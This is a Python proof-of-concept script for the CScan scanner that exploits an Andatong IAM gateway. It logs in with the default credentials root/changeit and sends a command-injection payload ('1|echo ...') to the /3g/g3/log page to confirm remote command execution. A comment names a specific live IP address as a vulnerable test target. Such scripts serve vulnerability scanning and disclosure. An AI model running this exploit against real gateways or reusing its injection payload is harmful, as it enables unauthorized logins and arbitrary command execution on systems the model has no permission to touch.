# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Unkonwn' # 平台漏洞编号，留空
    name = '安达通网关3g/g3/log命中执行漏洞' # 漏洞名称
    level = VulnLevel.SEVERITY # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2017-08-22'  # 漏洞公布时间
    desc = '''
        安达通网关系统存在默认口令，用户名root 密码changeit。
        可通过该账户登录系统,在'3g/g3/log'页面存在命令执行漏洞，
        可直接执行系统命令,来获取系统权限。
    ''' # 漏洞描述
    ref = 'http://vul.hu0g4.com/index.php/2017/11/21/5.html' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    product = 'IAM网关控制台'  # 漏洞应用名称
    product_version = 'x.6.660'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '8ebac327-c83c-478e-9797-de96edeede25'
    author = 'CScan'  # POC编写者
    create_date = '2018-3-24' #POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        post_data = {'username': 'root', 'password': 'changeit'}
        code_exec = {'line': '1|echo \'vuln\''}

        try:
            path = '{url}/home/login'.format(url=self.target)
            s = requests.Session()
            self.output.info('使用用户信息 {up} 访问 {path}'.format(path=path, up=post_data))
            response = s.post(path, data=post_data)

            if response.content == '1':
                self.output.warn(self.vuln, '发现弱口令 {up}'.format(up=post_data))

                path = self.target + '/3g/g3/log'
                self.output.info('发送 payload={0} 到 {1}'.format(code_exec, path))
                result = s.post(path, data=code_exec)

                if 'vuln' in result.content:
                    self.output.report(
                        self.vuln,
                        "目标 {url} 存在 /3g/g3/log 任意命令执行漏洞".format(url=self.target))
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    # 漏洞存在的网站 测试用 http://221.224.120.187:8080
    Poc().run()
